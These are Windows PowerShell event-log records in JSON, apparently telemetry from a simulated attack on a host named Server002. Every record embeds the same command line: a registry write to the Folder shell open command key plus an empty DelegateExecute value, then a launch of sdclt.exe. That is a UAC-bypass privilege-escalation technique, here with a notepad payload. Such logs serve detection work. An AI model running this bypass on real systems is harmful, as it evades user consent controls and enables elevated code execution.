{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"600"},"Version":"0","Level":"4","Task":"6","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-27 17:47:00.4113714"},"EventRecordID":"1043","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"Registry, Started, \tProviderName=Registry\r\n\tNewProviderState=Started\r\n\r\n\tSequenceNumber=1\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=5766664a-6476-417d-a560-ab4af1500225\r\n\tHostApplication=powershell.exe &amp; {New-Item -Force -Path \"HKCU:\\Software\\Classes\\Folder\\shell\\open\\command\" -Value 'cmd.exe /c notepad.exe'\r\nNew-ItemProperty -Force -Path \"HKCU:\\Software\\Classes\\Folder\\shell\\open\\command\" -Name \"DelegateExecute\"\r\nStart-Process -FilePath $env:windir\\system32\\sdclt.exe\r\nStart-Sleep -s 3}\r\n\tEngineVersion=\r\n\tRunspaceId=\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"600"},"Version":"0","Level":"4","Task":"6","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-27 17:47:00.4130149"},"EventRecordID":"1044","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"Alias, Started, \tProviderName=Alias\r\n\tNewProviderState=Started\r\n\r\n\tSequenceNumber=3\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=5766664a-6476-417d-a560-ab4af1500225\r\n\tHostApplication=powershell.exe &amp; {New-Item -Force -Path \"HKCU:\\Software\\Classes\\Folder\\shell\\open\\command\" -Value 'cmd.exe /c notepad.exe'\r\nNew-ItemProperty -Force -Path \"HKCU:\\Software\\Classes\\Folder\\shell\\open\\command\" -Name \"DelegateExecute\"\r\nStart-Process -FilePath $env:windir\\system32\\sdclt.exe\r\nStart-Sleep -s 3}\r\n\tEngineVersion=\r\n\tRunspaceId=\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"600"},"Version":"0","Level":"4","Task":"6","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-27 17:47:00.4130149"},"EventRecordID":"1045","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"Environment, Started, \tProviderName=Environment\r\n\tNewProviderState=Started\r\n\r\n\tSequenceNumber=5\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=5766664a-6476-417d-a560-ab4af1500225\r\n\tHostApplication=powershell.exe &amp; {New-Item -Force -Path \"HKCU:\\Software\\Classes\\Folder\\shell\\open\\command\" -Value 'cmd.exe /c notepad.exe'\r\nNew-ItemProperty -Force -Path \"HKCU:\\Software\\Classes\\Folder\\shell\\open\\command\" -Name \"DelegateExecute\"\r\nStart-Process -FilePath $env:windir\\system32\\sdclt.exe\r\nStart-Sleep -s 3}\r\n\tEngineVersion=\r\n\tRunspaceId=\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"600"},"Version":"0","Level":"4","Task":"6","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-27 17:47:00.4197680"},"EventRecordID":"1046","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"FileSystem, Started, \tProviderName=FileSystem\r\n\tNewProviderState=Started\r\n\r\n\tSequenceNumber=7\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=5766664a-6476-417d-a560-ab4af1500225\r\n\tHostApplication=powershell.exe &amp; {New-Item -Force -Path \"HKCU:\\Software\\Classes\\Folder\\shell\\open\\command\" -Value 'cmd.exe /c notepad.exe'\r\nNew-ItemProperty -Force -Path \"HKCU:\\Software\\Classes\\Folder\\shell\\open\\command\" -Name \"DelegateExecute\"\r\nStart-Process -FilePath $env:windir\\system32\\sdclt.exe\r\nStart-Sleep -s 3}\r\n\tEngineVersion=\r\n\tRunspaceId=\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"600"},"Version":"0","Level":"4","Task":"6","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-27 17:47:00.4212072"},"EventRecordID":"1047","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"Function, Started, \tProviderName=Function\r\n\tNewProviderState=Started\r\n\r\n\tSequenceNumber=9\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=5766664a-6476-417d-a560-ab4af1500225\r\n\tHostApplication=powershell.exe &amp; {New-Item -Force -Path \"HKCU:\\Software\\Classes\\Folder\\shell\\open\\command\" -Value 'cmd.exe /c notepad.exe'\r\nNew-ItemProperty -Force -Path \"HKCU:\\Software\\Classes\\Folder\\shell\\open\\command\" -Name \"DelegateExecute\"\r\nStart-Process -FilePath $env:windir\\system32\\sdclt.exe\r\nStart-Sleep -s 3}\r\n\tEngineVersion=\r\n\tRunspaceId=\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"600"},"Version":"0","Level":"4","Task":"6","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-27 17:47:00.4212072"},"EventRecordID":"1048","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"Variable, Started, \tProviderName=Variable\r\n\tNewProviderState=Started\r\n\r\n\tSequenceNumber=11\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=5766664a-6476-417d-a560-ab4af1500225\r\n\tHostApplication=powershell.exe &amp; {New-Item -Force -Path \"HKCU:\\Software\\Classes\\Folder\\shell\\open\\command\" -Value 'cmd.exe /c notepad.exe'\r\nNew-ItemProperty -Force -Path \"HKCU:\\Software\\Classes\\Folder\\shell\\open\\command\" -Name \"DelegateExecute\"\r\nStart-Process -FilePath $env:windir\\system32\\sdclt.exe\r\nStart-Sleep -s 3}\r\n\tEngineVersion=\r\n\tRunspaceId=\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"400"},"Version":"0","Level":"4","Task":"4","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-27 17:47:00.5360888"},"EventRecordID":"1049","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"Available, None, \tNewEngineState=Available\r\n\tPreviousEngineState=None\r\n\r\n\tSequenceNumber=13\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=5766664a-6476-417d-a560-ab4af1500225\r\n\tHostApplication=powershell.exe &amp; {New-Item -Force -Path \"HKCU:\\Software\\Classes\\Folder\\shell\\open\\command\" -Value 'cmd.exe /c notepad.exe'\r\nNew-ItemProperty -Force -Path \"HKCU:\\Software\\Classes\\Folder\\shell\\open\\command\" -Name \"DelegateExecute\"\r\nStart-Process -FilePath $env:windir\\system32\\sdclt.exe\r\nStart-Sleep -s 3}\r\n\tEngineVersion=5.1.19041.5007\r\n\tRunspaceId=5f3aabaa-94a4-4769-8593-3f30c2589627\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
